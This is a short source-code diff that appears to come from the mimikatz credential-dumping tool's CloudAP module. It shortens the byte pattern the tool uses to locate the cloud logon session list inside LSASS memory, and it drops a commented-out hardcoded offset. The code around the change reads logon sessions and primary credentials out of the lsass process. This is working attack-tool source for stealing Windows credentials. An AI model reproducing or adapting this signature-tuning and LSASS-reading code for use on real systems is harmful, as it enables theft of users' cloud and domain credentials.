@@ -6,7 +6,7 @@
 #include "kuhl_m_sekurlsa_cloudap.h"
 
 #if defined(_M_X64)
-BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42, 0x18, 0x75};
+BYTE PTRN_WALL_CloudApLocateLogonSession[]	= {0x44, 0x8b, 0x01, 0x44, 0x39, 0x42};//, 0x18, 0x75};
 KULL_M_PATCH_GENERIC CloudApReferences[] = {
 	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_WALL_CloudApLocateLogonSession),	PTRN_WALL_CloudApLocateLogonSession},	{0, NULL}, {-9}},
 };
@@ -35,7 +35,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_cloudap(IN PKIWI_BASIC_SECURIT
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {&logon, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	KIWI_GENERIC_PRIMARY_CREDENTIAL creds = {0};
 
-	if(kuhl_m_sekurlsa_cloudap_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_cloudap_package.Module, CloudApReferences, ARRAYSIZE(CloudApReferences), (PVOID *) &CloudApGlobalLogonSessionList, NULL, NULL, NULL)/*(CloudApGlobalLogonSessionList = (PKIWI_CLOUDAP_LOGON_LIST_ENTRY) ((PBYTE) kuhl_m_sekurlsa_cloudap_package.Module.Informations.DllBase.address + 0x71100))*/)
+	if(kuhl_m_sekurlsa_cloudap_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_cloudap_package.Module, CloudApReferences, ARRAYSIZE(CloudApReferences), (PVOID *) &CloudApGlobalLogonSessionList, NULL, NULL, NULL))
 	{
 		aLsassMemory.address = CloudApGlobalLogonSessionList;
 		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_CLOUDAP_LOGON_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
